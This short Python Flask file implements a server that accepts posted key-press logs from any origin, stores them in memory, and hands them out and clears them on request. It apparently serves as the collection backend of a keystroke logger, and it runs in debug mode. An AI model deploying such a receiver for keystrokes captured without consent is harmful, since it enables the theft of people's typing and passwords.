from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# In-memory storage for key press logs
key_press_logs = []

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    key_press_logs.extend(data)
    return jsonify({"status": "success", "message": "Data received"}), 200

@app.route('/logs', methods=['GET'])
def get_logs():
    global key_press_logs
    logs = key_press_logs.copy()
    key_press_logs = []  # Clear the logs after sending them
    return jsonify(logs), 200

@app.route('/clear_logs',methods=["POST"])
def clear_logs():
    global key_press_logs
    key_press_logs=[]

    return jsonify({"message":"logs cleared"}),200

if __name__ == '__main__':
    app.run(debug=True)


